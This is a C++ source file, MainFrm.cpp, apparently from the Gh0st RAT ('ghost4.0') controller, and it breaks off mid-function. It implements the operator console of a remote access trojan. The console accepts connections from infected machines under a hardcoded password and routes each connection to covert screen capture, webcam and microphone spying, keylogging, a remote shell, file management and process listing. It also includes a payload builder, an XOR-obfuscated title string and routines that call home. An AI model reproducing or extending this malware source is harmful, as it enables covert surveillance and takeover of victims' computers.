// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "gh0st.h"
#include "EventView.h"
#include "MainFrm.h"
#include "Gh0stView.h"
#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "KeyBoardDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"
#include "Splash.h"
#include "BuildDialog.h"
#include "ConfigDlg.h"
#include "LogonDialog.h"
#include <Wininet.h>
#pragma comment(lib,"Wininet.lib")
#include <TLHELP32.H>
#include "MyToolsKit.h"
#include "CloseDlg.h"
#include "CommuniqueDlg.h"
#include "PluginDlg.h"
#include "UpdateDlg.h"
#include "Skin.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
#define WM_ICON_NOTIFY WM_USER+10

CGh0stView* g_pConnectView = NULL; //��NotifyProc�г�ʼ��
CEventView* g_pEventView = NULL; //��NotifyProc�г�ʼ��
CIOCPServer *m_iocpServer = NULL;
CString		m_PassWord = "password";
CMainFrame	*g_pFrame; // ��CMainFrame::CMainFrame()�г�ʼ��

/////////////////////////////////////////////////////////////////////////////
// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	//{{AFX_MSG_MAP(CMainFrame)
	ON_WM_CREATE()
	ON_WM_CLOSE()
	ON_WM_SYSCOMMAND()
	ON_MESSAGE(WM_ICON_NOTIFY, OnTrayNotification)
	ON_UPDATE_COMMAND_UI(ID_STAUTSTIP, OnUpdateStatusBar)
	ON_COMMAND(IDM_SHOW, OnShow)
	ON_COMMAND(IDM_HIDE, OnHide)
	ON_COMMAND(IDM_EXIT, OnExit)
	ON_WM_SHOWWINDOW()
	ON_WM_PAINT()
	ON_COMMAND(IDT_ABOUTTERMINATE, OnAboutterminate)
	ON_COMMAND(IDT_EXITPROCESS, OnExitprocess)
	ON_COMMAND(IDT_CREATESERVER, OnCreateserver)
	ON_COMMAND(IDM_CONFIGING, OnConfiging)
	ON_WM_TIMER()
	ON_COMMAND(IDM_CHECKUPDATE, OnCheckupdate)
	ON_COMMAND(IDM_OFFICAIL, OnOfficail)
	ON_COMMAND(ID_APP_ABOUT, OnAppAbout)
	ON_COMMAND(IDT_TOOLS, OnTools)
	ON_COMMAND(IDM_GXIP, OnGxip)
	ON_COMMAND(ID_ADD_SKIN, OnAddSkin)
	ON_COMMAND(ID_BLACK_SKIN, OnBlackSkin)
	ON_COMMAND(ID_BLUE_SKIN, OnBlueSkin)
	ON_COMMAND(ID_RED_SKIN, OnRedSkin)
	ON_COMMAND(ID_SILVER_SKIN, OnSilverSkin)
	ON_COMMAND(ID_DEL_SKIN, OnDelSkin)
	ON_UPDATE_COMMAND_UI(ID_STAUTSSPEED, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSPORT, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSCOUNT, OnUpdateStatusBar)
	ON_COMMAND(ID_CHANGE_SKIN, OnChangeSkin)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_STAUTSTIP,           // status line indicator
	ID_STAUTSSPEED,
	ID_STAUTSPORT,
	ID_STAUTSCOUNT,
	ID_STAUTSWEICOME
};

VOID MyEncryptFunction(LPSTR szData,WORD Size);

static CHAR EncryStr[]="\xd5\xd7\xb8\xe9\xd0\xde\x50\x42\x56\x25"
"\x31\x2a\x30\x22\xbc\xe5\xb4\xf8\xb2\xe2"
"\x25\0x00";

/////////////////////////////////////////////////////////////////////////////
// CMainFrame construction/destruction
BOOL CMainFrame::MarkHeard=TRUE;

CRITICAL_SECTION cs={NULL};


CMainFrame::CMainFrame()
{
	// TODO: add member initialization code here
	g_pFrame = this;
	MyEncryptFunction(EncryStr,strlen(EncryStr));
	MarkAnimateShow = TRUE;
	InitializeCriticalSection(&cs);
}

CMainFrame::~CMainFrame()
{
}

void TransParentDC(CRect rect,CDC * pDC)
{
	CDC m_MemDC;
	m_MemDC.CreateCompatibleDC(pDC);
	CBitmap m_Bitmap;
	m_Bitmap.CreateCompatibleBitmap
		(pDC,rect.Width(),rect.Height());
	CBitmap *pOldBitmap = 
		m_MemDC.SelectObject(&m_Bitmap);
	m_MemDC.FillSolidRect(0,0,rect.Width(),
		rect.Height(),GetSysColor(COLOR_MENU));

	COLORREF cor =  pDC->GetPixel(0,0);
	for(int y = 0; y < rect.Height();y++)
	{
		for(int x = 0; x < rect.Width(); x++)
		{
			COLORREF ch = pDC->GetPixel(x,y);
			if(ch != cor)
				m_MemDC.SetPixelV(x,y,ch);
		}
	}
	pDC->BitBlt(0,0,rect.Width(),
		rect.Height(),&m_MemDC,0,0,SRCCOPY);
	m_MemDC.SelectObject(pOldBitmap);
	m_Bitmap.DeleteObject();
}

CSize CMainFrame::LoadMyBitmap(UINT nID)
{
	CDC * pDC = GetDC();
	CDC m_MemDC;
	m_MemDC.CreateCompatibleDC(pDC);
	CSize m_Size = pDC->GetTextExtent("ˢ��");
	ReleaseDC(pDC);
	CRect rect(0,0,60,32);
	CBitmap *pBitmap,*pOldBitmap;
	pBitmap = new CBitmap;
	pBitmap->LoadBitmap(nID);
	pOldBitmap = m_MemDC.SelectObject(pBitmap);
	TransParentDC(rect,&m_MemDC);
	m_MemDC.SelectObject(pOldBitmap);
	m_ToolBarList.Add(pBitmap,GetSysColor(COLOR_MENU));
	pBitmap->DeleteObject();
	delete pBitmap;
	return m_Size;
}

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;

		if (!m_wndToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_wndToolBar.LoadToolBar(IDR_MAINFRAME))
	{
		TRACE0("Failed to create toolbar\n");
		return -1;      // fail to create
	}
	m_ToolBarList.Create(60,32,ILC_COLOR24|ILC_MASK,10,10);

	CSize m_Size =LoadMyBitmap(IDB_BITMAP_ATTACK);
	
	LoadMyBitmap(IDB_BITMAP_SCREEN);
	LoadMyBitmap(IDB_BITMAP_FILEMANAGER);
	LoadMyBitmap(IDB_BITMAP_KEYBORD);
	LoadMyBitmap(IDB_BITMAP_COMMAND);
	LoadMyBitmap(IDB_BITMAP_SYSMANAGER);
	LoadMyBitmap(IDB_BITMAP_VEDIO);
	LoadMyBitmap(IDB_BITMAP_SOUND);
	LoadMyBitmap(IDB_BITMAP_CREATESERVER);
	LoadMyBitmap(IDB_BITMAP_SIFT);
	LoadMyBitmap(IDB_BITMAP_UPDATE);
	LoadMyBitmap(IDB_BITMAP_ABOUT);
	LoadMyBitmap(IDB_BITMAP_TOOLS);
	LoadMyBitmap(IDB_BITMAP_EXIT);
	
	m_wndToolBar.SetButtonText(0,_T("ѹ������"));	
	m_wndToolBar.SetButtonText(1,_T("��Ļ���"));
	m_wndToolBar.SetButtonText(3,_T("�ļ�����"));
	m_wndToolBar.SetButtonText(5,_T("���̼�¼"));
	m_wndToolBar.SetButtonText(6,_T("Զ���ն�"));
	m_wndToolBar.SetButtonText(8,_T("ϵͳ����"));
	m_wndToolBar.SetButtonText(9,_T("��Ƶ���"));
	m_wndToolBar.SetButtonText(10,_T("��������"));
	m_wndToolBar.SetButtonText(11,_T("���ɷ����"));
	m_wndToolBar.SetButtonText(12,_T("ʵ�ù���"));
	m_wndToolBar.SetButtonText(13,_T("����"));
	m_wndToolBar.SetButtonText(14,_T("�˳�"));
	
	m_wndToolBar.GetToolBarCtrl().SetImageList(&m_ToolBarList);
	m_wndToolBar.GetToolBarCtrl().SetDisabledImageList(&m_ToolBarList);
	m_wndToolBar.GetToolBarCtrl().SetButtonSize(CSize(60,32 + m_Size.cy + 4));
	m_wndToolBar.GetToolBarCtrl().SetBitmapSize(CSize(60,32));

	m_wndToolBar.EnableDocking(CBRS_ALIGN_ANY);
	EnableDocking(CBRS_ALIGN_ANY);
	DockControlBar(&m_wndToolBar);
	//-----------------------------------------------------------------------------------------------------

	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		  sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 300);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 100);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, 100);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(4), SBPS_NORMAL, 100);
	if(	!m_wndTab.Create
		(
		WS_CHILD | WS_VISIBLE | CTCS_AUTOHIDEBUTTONS | CTCS_TOOLTIPS | CTCS_DRAGMOVE | CTCS_LEFT,
		CRect(0, 0, 0, 2),
		this,
		IDC_TABCTRL
		)
		)
	{
		TRACE0("Failed to create tab control\n");
		return -1;
	}
	m_wndTab.SetDragCursors(AfxGetApp()->LoadStandardCursor(IDC_CROSS),NULL);
	m_wndTab.ModifyStyle(CTCS_LEFT, 0, 0);

	/*
	LOGFONT lf = {10, 0, 0, 0, FW_NORMAL, 0, 0, 0,
		DEFAULT_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS,
		DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "������"};
	m_wndTab.SetControlFont(lf, TRUE);
	*/


	// CG: The following line was added by the Splash Screen component.
	CSplashWnd::ShowSplashScreen(this);
	
	if(!((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "CloseAllAnimate",false))
		Sleep(2000);

	
	return 0;
}

VOID MyEncryptFunction(LPSTR szData,WORD Size)
{
	//�������������
	WORD AddTable[]={
			3,2,5,8,5,1,2,3,2,5,3,4,1,2,
			4,3,5,8,2,4,5,8,1,2,4,3,1,1,
			8,1,2,4,3,1,1,5,2,2,1,2,1,3,
			5,2,2,1,2,1,3,3,1,2,3,5,2,6,
			2,4,1,3,2,1,2,6,2,3,3,2,1,1,
			3,6,2,1,2,4,4,3,1,2,3,5,2,6,
			3,1,2,3,5,2,6,5,2,2,1,2,1,2,
			6,2,3,3,2,1,1,5,2,2,1,2,1,2,
			3,2,5,3,4,1,2,2,3,1,2,3,5,2
	};
	
	WORD TableSize = sizeof(AddTable)/sizeof(WORD);
	WORD iCount=0;
	for (WORD i=0;i<Size;i++)
	{
		if(iCount == TableSize) 
			iCount = 0;
		
		szData[i]^=AddTable[iCount];
		//BUG  ����iCount++ ��������������� 3..
		iCount++;
	}
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.cx = 960;
	if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
	{
		cs.cx += 131;
	}
	cs.cy = 540;
	cs.style &= ~FWS_ADDTOTITLE;
	CString szTitle=((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Settings", "Title","ghost4.0");

	if(szTitle.GetLength()>2)
		cs.lpszName = szTitle.GetBuffer(0);
	else
		cs.lpszName = EncryStr;

	SetTimer(0x100,100,NULL);

	return TRUE;
}

/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
    if (m_hWnd == NULL)
        return;     // null (unattached) windows are valid
	
    // check for special wnd??? values
    ASSERT(HWND_TOP == NULL);       // same as desktop
    if (m_hWnd == HWND_BOTTOM)
        ASSERT(this == &CWnd::wndBottom);
    else if (m_hWnd == HWND_TOPMOST)
        ASSERT(this == &CWnd::wndTopMost);
    else if (m_hWnd == HWND_NOTOPMOST)
        ASSERT(this == &CWnd::wndNoTopMost);
    else
    {
        // should be a normal window
        ASSERT(::IsWindow(m_hWnd));
	}
	//CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers

void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	try
	{
		CMainFrame* pFrame = (CMainFrame*) lpParam;
		CString str;
		// ��g_pConnectView ���г�ʼ��
		g_pConnectView = (CGh0stView *)((CGh0stApp *)AfxGetApp())->m_pConnectView;

		// g_pConnectView��û��������������ᷢ��
		if (((CGh0stApp *)AfxGetApp())->m_pConnectView == NULL)
			return;

		g_pConnectView->m_iocpServer = m_iocpServer;

		str.Format("����: %.2f kb/s ����: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
		g_pFrame->m_wndStatusBar.SetPaneText(1, str);

		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
			ProcessReceiveComplete(pContext);
			break;
		}
	}catch(...){}
}

void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
{
	CString		str="����IP:";

	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;

	}
	m_iocpServer = new CIOCPServer;

	// ����IPCP������
 	if (m_iocpServer->Initialize(NotifyProc, this, 100000, nPort))
 	{

		char hostname[256]; 
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
		{ 
			for ( int i=0; ; i++ )
			{ 
				str += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
				if ( host->h_addr_list[i] + host->h_length >= host->h_name )
					break;
				str += "/";
			}
		}

  		m_wndStatusBar.SetPaneText(0, str);
 		str.Format("�˿�: %d", nPort);
 		m_wndStatusBar.SetPaneText(2, str);
 	}
 	else
 	{
 		str.Format("�˿�%d��ʧ��", nPort);
 		m_wndStatusBar.SetPaneText(0, str);
 		m_wndStatusBar.SetPaneText(2, "�˿�: 0");
 	}

	m_wndStatusBar.SetPaneText(3, "����: 0");
}

void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// �������Ի���򿪣�������Ӧ�ĶԻ�����
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// �������ڴ���
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceiveComplete();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		case KEYBOARD_DLG:
			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		case PLUGIN_DLG:
			((CPluginDlg *)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUTH: // Ҫ����֤
		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		break;
	case TOKEN_HEARTBEAT: // �ظ�������
		{
			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}
 		break;
	case TOKEN_LOGIN: // ���߰�
		{
			
			if (m_iocpServer->m_nMaxConnections <= g_pConnectView->GetListCtrl().GetItemCount())
			{
				closesocket(pContext->m_Socket);
			}
			else
			{
				pContext->m_bIsMainSocket = true;
				g_pConnectView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
				
			}
			// ����
			BYTE	bToken = COMMAND_ACTIVED;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}

		break;
	case TOKEN_DRIVE_LIST: // �������б�
		// ָ�ӵ���public������ģ̬�Ի����ʧȥ��Ӧ�� ��֪����ô����,̫��
		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: //
		// ָ�ӵ���public������ģ̬�Ի����ʧȥ��Ӧ�� ��֪����ô����
		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // ����ͷ
		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break; 
	case TOKEN_AUDIO_START: // ����
		g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START:
		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PSLIST:
		g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START:
		g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;

	case TOKEN_PLUGIN_START:
		g_pConnectView->PostMessage(WM_OPENPLUGINDIALOG, 0, (LPARAM)pContext);
		break;
		
	case TOKEN_SIFT_WINTEXT:
	case TOKEN_SIFT_PROCESS:
		g_pConnectView->SiftConTextData(pContext);
		break;
	
	// ����ֹͣ��ǰ����
	default:
		closesocket(pContext->m_Socket);
		break;
	}	
}

// ��Ҫ��ʾ���ȵĴ���
void CMainFrame::ProcessReceive(ClientContext *pContext)
{
	if (pContext == NULL)
		return;
	// �������Ի���򿪣�������Ӧ�ĶԻ�����
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// �������ڴ���
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceive();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceive();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceive();
			break;
		default:
			break;
		}
		return;
	}
}

void CMainFrame::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
   // if (::MessageBox(NULL, "ȥ���뼼��С��vipС�鿴��ô?", "ȥ������", MB_OKCANCEL|MB_ICONQUESTION) == IDOK)
	//{
	//	char url[27] = {'h','t','t','p',':','/','/','w','w','w','.','h','a','c','k','h','w','.','c','o','m','\0'};
//		ShellExecute(0,"open","http://www.54cz.com",NULL,NULL,SW_SHOW);
	//}
	//�ص���������..���߷�������Ѿ��˳���  �Ͻ��Ͽ�...
	if(g_pConnectView!=NULL)
		g_pConnectView->OnClientExit();

	CCloseDlg dlg;
	dlg.DoModal();

	m_TrayIcon.RemoveIcon();
	m_iocpServer->Shutdown();
	delete m_iocpServer;

	if(!((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Animate",FALSE))
			AnimateWindow(m_hWnd,1000,AW_BLEND|AW_HIDE);

	CFrameWnd::OnClose();
}

LRESULT CMainFrame::OnTrayNotification(WPARAM wParam, LPARAM lParam)
{
	if (LOWORD(lParam) == WM_LBUTTONDBLCLK)
	{
		ShowWindow(SW_SHOW);
		return TRUE;
	}
	return m_TrayIcon.OnTrayNotification(wParam, lParam);
}

void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
{
	if (nID == SC_MINIMIZE)
	{
		if (!m_TrayIcon.Enabled())
			m_TrayIcon.Create(this, WM_ICON_NOTIFY, "Running ....",
			AfxGetApp()->LoadIcon(IDR_MAINFRAME), IDR_MINIMIZE, TRUE); //����
		ShowWindow(SW_HIDE);
	}
	else
	{
		CFrameWnd::OnSysCommand(nID, lParam);
	}
}
void CMainFrame::OnUpdateStatusBar(CCmdUI *pCmdUI)
{
	// TODO: Add your message handler code here and/or call default
	pCmdUI->Enable();
}

void CMainFrame::ShowConnectionsNumber()
{
	CString str;
	str.Format("����: %d", g_pConnectView->GetListCtrl().GetItemCount());
	m_wndStatusBar.SetPaneText(3, str);
}

void CMainFrame::OnShow() 
{
	// TODO: Add your command handler code here

	ShowWindow(SW_SHOW);
	::SetForegroundWindow(m_hWnd);
}

void CMainFrame::OnHide() 
{
	// TODO: Add your command handler code here
	ShowWindow(SW_HIDE);
}

void CMainFrame::OnExit() 
{
	// TODO: Add your command handler code here
	OnClose();
}

void CMainFrame::ShowToolTips(LPCTSTR lpszText)
{
	g_pFrame->m_TrayIcon.SetTooltipText(lpszText);
}

BOOL MarkShowWindow=TRUE;

void CMainFrame::OnShowWindow(BOOL bShow, UINT nStatus) 
{
	CFrameWnd::OnShowWindow(bShow, nStatus);
	
	// TODO: Add your message handler code here
	CenterWindow();
	if(MarkAnimateShow)
	{
		if(!((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Animate",FALSE))
			AnimateWindow(m_hWnd,1000,AW_BLEND);
	}
	MarkAnimateShow = FALSE;

	if(MarkShowWindow)
	{
		if(!((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Logon",FALSE))
			SetTimer(0x100,100,NULL);

		/*
		if(!((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "CloseAllAnimate",false))
			SetTimer(0x101,10*60*1000,NULL);
		else
			if(!((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Announcement", FALSE))
				SetTimer(0x101,10*60*1000,NULL);
		*/

		SetTimer(0x102,20000,NULL);
	}
	if(((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "CloseAllAnimate",false))
	{
		CMenu  *menu = GetMenu();
		menu->EnableMenuItem(0, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
	}
	MarkShowWindow=FALSE;

	SetTimer(0x200,2000,NULL);
}

void CMainFrame::OnPaint() 
{
	CPaintDC dc(this); // device context for painting
	
	// TODO: Add your message handler code here
	// Do not call CFrameWnd::OnPaint() for painting messages
}


void CMainFrame::OnAboutterminate() 
{
	// TODO: Add your command handler code here

	TCHAR *pIntro={
		_T("ghost4.0\t|"
			"CopyRight 2012\r||"
			"�벻Ҫ����������ڷǷ���;,|"
			"һ�к������ʹ���߱��˸���!||"
			"|"
			"My Hackers Dream,  My All.\r||"
			"www.hackeyes.com\t||"
			"|��ESC�˳�||") 
			
	};
	((CGh0stApp *)AfxGetApp())->pIntro=pIntro;
	((CGh0stApp *)AfxGetApp())->OnAppAbout();
}

void CMainFrame::OnExitprocess() 
{
	// TODO: Add your command handler code here
	OnClose();
}



void CMainFrame::OnCreateserver() 
{
	// TODO: Add your command handler code here
	CBuildDialog m_BuildDlg;
	m_BuildDlg.DoModal();
}

void CMainFrame::OnConfiging() 
{
	// TODO: Add your command handler code here
	CConfigDlg m_ConfigDlg;
	m_ConfigDlg.DoModal();
}


//����ͷ.
static struct REQUSET
{
	WORD Type;        //��������
	CHAR Name[100];   //�û���
	CHAR Pass[100];   //����
	CHAR Permissions[100];//������..
};

BOOL SendData(SOCKET s, char *data, int len);
BOOL RecvData(SOCKET s, char *data, int len);


BOOL DownLoadToFile(IN LPSTR szUrl,IN LPSTR szSavePath)
{
	DWORD dwFlags;
	if(!InternetGetConnectedState(&dwFlags,0))
	{   
		return FALSE;
	}
	char strAgent[64];
	char Nod32[]="Agent";
	wsprintf(strAgent,"%s%ld",Nod32,timeGetTime());
	HINTERNET hOpen;
	
	
	if(!(dwFlags & INTERNET_CONNECTION_PROXY))
		hOpen = InternetOpenA(strAgent,INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY,NULL,NULL,0);
	else
		hOpen = InternetOpenA(strAgent,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
	
	if(!hOpen) return FALSE;
	
	DWORD dwSize;
	char szHead[] = "Accept: */*\r\n\r\n";
	void* szTemp[16384];
	HINTERNET hConnect;
	if(!(hConnect = InternetOpenUrlA(hOpen,szUrl,szHead,strlen(szHead),INTERNET_FLAG_DONT_CACHE|INTERNET_FLAG_PRAGMA_NOCACHE|INTERNET_FLAG_RELOAD,0)))
	{
		return FALSE;
	}
	DeleteFile(szSavePath);

	HANDLE m_Handle = CreateFile(szSavePath,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,
		CREATE_NEW,FILE_ATTRIBUTE_NORMAL,NULL);
	
	if(m_Handle == INVALID_HANDLE_VALUE)
		return FALSE;


	DWORD dwByteToRead = 0;
	DWORD dwSizeOfRq = 4;
	DWORD dwBytes = 0;
	DWORD Writen=0;

	if(!HttpQueryInfoA(hConnect,HTTP_QUERY_CONTENT_LENGTH|HTTP_QUERY_FLAG_NUMBER,(LPVOID)&dwByteToRead,&dwSizeOfRq,NULL))
	{
		dwByteToRead = 0;
	}
	do
	{
		if(!InternetReadFile(hConnect,szTemp,16384,&dwSize))
		{
			InternetCloseHandle(hOpen);
			CloseHandle(NULL);
			return FALSE;
		}
		if(dwSize == 0) break;
		else WriteFile(m_Handle,szTemp,dwSize,&Writen,NULL);
		
	}while(true);

	CloseHandle(m_Handle);

	InternetCloseHandle(hOpen);
	return TRUE;
}

DWORD WINAPI CheckUpdata(LPVOID lParam)
{

	try
	{
	BOOL MarkTip;

	if(lParam == NULL)
		MarkTip =FALSE;
	else
		MarkTip =TRUE;

	REQUSET m_Update={5,UPDATAVERSION,FILEVERSION,PERMISSIONS};

	SOCKET m_Socket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	
	SOCKADDR_IN m_Addr={NULL};
	
	m_Addr.sin_family = AF_INET;

	CString szDns = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Settings", "ServerAddress","");
	if(szDns.IsEmpty())
		m_Addr.sin_addr.S_un.S_addr = ResolvDNS(OFFICIALADDRESS);
	else
		m_Addr.sin_addr.S_un.S_addr = ResolvDNS(szDns.GetBuffer(0));

	m_Addr.sin_port = htons(SERVERPORT);
	
	
	if(connect(m_Socket,(SOCKADDR *)&m_Addr,sizeof(SOCKADDR))!=SOCKET_ERROR)
	{
		if(SendData(m_Socket,(char *)&m_Update,sizeof(REQUSET)))
		{
			REQUSET m_Recv;
			ZeroMemory(&m_Recv,sizeof(REQUSET));
		
			RecvData(m_Socket,(char *)&m_Recv,sizeof(REQUSET));
			closesocket(m_Socket);
			//˵���и��µ���...
			if(m_Recv.Type)
			{
				if(strcmp(m_Recv.Name,m_Update.Pass)==0)
				{	
					if(MarkTip)
						::MessageBox(NULL,"�����°汾����","��ʾ",MB_OK|MB_ICONINFORMATION);
					return 1;
				}

				CString szTips;
				szTips.Format("ghost4.0  �����°汾 Version:%s ���Ƿ���Ҫ����?",m_Recv.Name);
				if(::MessageBox(NULL,szTips.GetBuffer(0),"������ʾ",MB_YESNO|MB_ICONINFORMATION)==IDYES)
				{
					//����....
					CFileDialog * File_Point = new CFileDialog(FALSE,"exe","ghost3.4",
						OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,"*.exe||",NULL);
					if(File_Point->DoModal()==IDOK)
					{
						CString szPath;
						szPath = File_Point->GetPathName();
						DownLoadToFile(m_Recv.Pass,szPath.GetBuffer(0));
						::MessageBox(NULL,"��ϲ ���³ɹ�!���滻�°汾!","��ʾ",MB_OK|MB_ICONINFORMATION);
					}
				}
				
			}
		}
	}
	else
		closesocket(m_Socket);
	}
	catch(...)
	{
		return 1;
	}

	return 0;
}


void CMainFrame::OnCheckupdate() 
{
	// TODO: Add your command handler code here
	BOOL MarkHeart = TRUE;

	CloseHandle(CreateThread(NULL,NULL,CheckUpdata,&MarkHeart,NULL,NULL));
}



DWORD WINAPI Announcement(LPVOID lParam)
{
	//CMainFrame *Point = (CMainFrame *)lParam;
	
	REQUSET m_Update={6,"","",""};
	
	SOCKET m_Socket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	
	SOCKADDR_IN m_Addr={NULL};
	ZeroMemory(&m_Addr,sizeof(SOCKADDR_IN));

	m_Addr.sin_family = AF_INET;
	
	CString szDns = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Settings", "ServerAddress","");
	if(szDns.IsEmpty())
		m_Addr.sin_addr.S_un.S_addr = ResolvDNS(OFFICIALADDRESS);
	else
		m_Addr.sin_addr.S_un.S_addr = ResolvDNS(szDns.GetBuffer(0));

	m_Addr.sin_port = htons(SERVERPORT);
	
	
	static CHAR szBuffer[2000]={"����"};



	CHAR TempBuffer[2000]={NULL};
	ZeroMemory(TempBuffer,2000);
	strcpy(TempBuffer,szBuffer);

	CCommuniqueDlg m_dlg;
	EnterCriticalSection(&cs);
	ZeroMemory(szBuffer,2000);
	LeaveCriticalSection(&cs);

	if(connect(m_Socket,(SOCKADDR *)&m_Addr,sizeof(SOCKADDR))!=SOCKET_ERROR)
	{
		if(SendData(m_Socket,(char *)&m_Update,sizeof(REQUSET)))
		{
			RecvData(m_Socket,szBuffer,2000);
			closesocket(m_Socket);

			if(strcmp(TempBuffer,szBuffer))
